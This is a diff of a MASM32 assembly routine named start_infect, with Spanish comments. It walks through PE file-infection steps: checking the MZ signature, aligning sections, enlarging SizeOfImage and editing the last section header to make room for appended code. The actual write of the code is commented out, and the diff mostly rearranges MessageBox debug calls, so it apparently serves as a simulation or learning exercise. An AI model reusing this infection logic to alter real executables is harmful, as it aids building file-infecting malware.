@@ -49,18 +49,13 @@ includelib \masm32\lib\msvcrt.lib
 
 .CODE
 start_infect PROC
-    ; Simular el proceso de infección
-      mov filesize_sf, eax
-      lea ecx,dword ptr [mycode_len]
-      mov ecx,end_copy
-      sub ecx,begin_copy
-    invoke wsprintf, addr buffer_mycode_len, addr format_l, mycode_len
-    invoke MessageBoxA, NULL, addr buffer_mycode_len, addr msgCaption, MB_OK
+  ; Simular el proceso de infección
 
-    invoke MessageBoxA, NULL, addr mycode_len , addr msgCaption_db_1, MB_OK
- invoke MessageBoxA, NULL, addr msgText_2, addr msgCaption_db_1, MB_OK
     pushad
 
+     mov filesize_sf, eax
+     invoke MessageBoxA, NULL, addr buffer_2, addr msgCaption, MB_OK
+     invoke MessageBoxA, NULL, addr msgText_2, addr msgCaption_db_1, MB_OK
     ; Verificar la firma DOS
     invoke MessageBoxA, NULL, esi, addr msgCaption, MB_OK 
     cmp  WORD ptr [esi], "ZM"
@@ -168,10 +163,15 @@ invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK
     push edx
     mov  edx, sectionalignment
     call ceil_align
+    
     invoke MessageBoxA, NULL, edx, addr msgCaption_db_1, MB_OK 
+   
     pop edx
+    
     mov  dword ptr [lastsec_virtualaddress], eax
-    invoke MessageBoxA, NULL, eax, addr msgCaption_db_1, MB_OK 
+    
+    ;invoke MessageBoxA, NULL, eax, addr msgCaption_db_1, MB_OK 
+   
     ; Calcular el nuevo tamaño de la imagen
     lea  ecx, dword ptr [ptr_sizeofimage]
     mov  edx, dword ptr [ecx]
@@ -179,35 +179,41 @@ invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK
     push edx
     mov  edx, sectionalignment
     
-    invoke MessageBoxA, NULL, addr sectionalignment, addr msgCaption_db_1, MB_OK 
+    ;invoke MessageBoxA, NULL, addr sectionalignment, addr msgCaption_db_1, MB_OK 
+    
     call ceil_align
+     
     pop edx
     mov  dword ptr [ecx], eax
 
     ; Escribir el código en el archivo mapeado
     lea  esi, dword ptr [ptr_sectionhdrtable]
-    invoke MessageBoxA, NULL, addr ptr_sectionhdrtable, addr msgCaption_db_1, MB_OK 
+    
+    invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK 
     add  esi, dword ptr [ptr_numberofsections]
-    invoke MessageBoxA, NULL, addr ptr_numberofsections, addr msgCaption_db_1, MB_OK 
+    invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK 
     mov  ecx, dword ptr [lastsec_ptrtorawdata]
-    invoke MessageBoxA, NULL, addr lastsec_ptrtorawdata, addr msgCaption_db_1, MB_OK 
+    invoke MessageBoxA, NULL, ecx, addr msgCaption_db_1, MB_OK 
     add  ecx, dword ptr [lastsec_sizeofrawdata]
-    invoke MessageBoxA, NULL, addr lastsec_sizeofrawdata, addr msgCaption_db_1, MB_OK 
+    invoke MessageBoxA, NULL, ecx, addr msgCaption_db_1, MB_OK 
+    
+
    ; mov  dword ptr [esi + 08h], mycode_len
     mov  dword ptr [esi + 0ch], ecx
     mov  eax, mycode_len
     mov  dword ptr [esi + 10h], eax
-    invoke MessageBoxA, NULL, addr mycode_len, addr msgCaption_db_1, MB_OK 
+
    ; invoke WriteFile, hfile, addr mycodestart, mycode_len, addr numwrite, 0
 
     invoke MessageBoxA, NULL, addr msgEnd, addr msgCaption, MB_OK
-
-    jmp  short fin
+  
+    jmp  fin
     
 infect_err:
     invoke MessageBoxA, NULL, addr msgError , addr msgCaption, MB_OK 
 
 fin:
+       
     popad
     ret
 start_infect ENDP
